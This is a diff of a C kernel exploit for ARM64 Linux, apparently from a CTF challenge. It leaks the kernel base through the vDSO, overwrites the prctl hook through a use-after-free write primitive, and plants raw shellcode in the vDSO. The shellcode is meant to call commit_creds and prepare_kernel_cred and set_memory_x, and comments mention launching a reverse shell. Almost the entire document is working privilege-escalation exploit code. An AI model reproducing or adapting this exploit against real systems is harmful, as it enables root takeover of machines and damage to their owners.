@@ -167,11 +167,13 @@ unsigned long *p_map;
 	struct init_args i_args;
 	struct realloc_args rello_args;
 size_t kernel_base=0;
-size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
-size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
-size_t order_cmd=0xe4cf40;       //mov    rdi,0xffffffff81e4cf40
-size_t poweroff_work_addr=0xa7590; // ffffffff810a7590 t poweroff_work_func
-
+//size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0
+size_t prctl_hook=0x2f2310;//c7108; //2f2310            // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8
+size_t order_cmd=0xd3210;       //mov    rdi,0xffffffff81e4cf40
+size_t poweroff_work_addr=0x90c608; // ffffffff810a7590 t poweroff_work_func
+size_t prepare_kernel_cred_addr=0xd2d60;
+size_t commit_creds_addr=0xd2800;
+size_t set_memory_x_addr=0x95270;
 
 char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x9a\x92\xa1\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xff\x9a\x92\xa1\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6"; 
 size_t result=0;
@@ -205,15 +207,23 @@ for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
 }
 
 kernel_base=result & 0xffffffffff000000;
-selinux_disable_addr+=kernel_base;
+//selinux_disable_addr+=kernel_base;
 prctl_hook+=kernel_base;
 order_cmd+=kernel_base;
 poweroff_work_addr+=kernel_base;
+prepare_kernel_cred_addr+=kernel_base;
+commit_creds_addr+=kernel_base;
+set_memory_x_addr+=kernel_base;
+
 printf("[+] found kernel_base: %p\n",kernel_base);
 printf("[+] found prctl_hook: %p\n",prctl_hook);
 printf("[+] found order_cmd: %p\n",order_cmd);
-printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
+//printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);
 printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);
+
+printf("[+] found prepare_kernel_cred_addr: %p\n",prepare_kernel_cred_addr);
+printf("[+] found commit_creds_addr: %p\n",commit_creds_addr);
+printf("[+] found set_memory_x_addr: %p\n",set_memory_x_addr);
 
 size_t vdso_addr=result;
 size_t VDSO_SIZE=0x1000;
@@ -226,14 +236,15 @@ write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));
 
 // 劫持prctl_hook去执行poweroff_work
 memset(buf,'\x00',0x1000);
-*(size_t *)buf = poweroff_work_addr;
+*(size_t *)buf = set_memory_x_addr;
 write_mem(fd,prctl_hook, buf, 8);
 
 //需要fork()子线程来执行reverse_shell程序
-if (fork()==0){
-	prctl(addr,2,addr,addr,2);
-	exit(-1);
-}
+//if (fork()==0){
+	prctl(vdso_addr,1,NULL,NULL,NULL);
+	use_after_free_msgsnd(fd,vdso_patch[0].addr,0);  //MMAP_ADDR
+	//exit(-1);
+//}
 
 //if (check_vdso_shellcode(shellcode)!=0)
 //{	
